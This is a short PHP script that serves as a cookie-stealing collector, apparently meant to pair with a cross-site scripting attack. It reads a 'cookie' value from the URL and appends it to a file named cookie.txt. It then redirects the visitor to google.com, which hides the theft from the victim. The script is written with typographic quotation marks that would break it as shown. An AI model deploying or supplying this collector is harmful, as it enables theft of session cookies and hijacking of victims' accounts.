<?php

if(isset($_GET[‘cookie’])){

$o = fopen(“cookie.txt”, ‘a’);

fwrite($o, $_GET[‘cookie’]);

fclose($o);

header(“Location: https://google.com”);
}

?>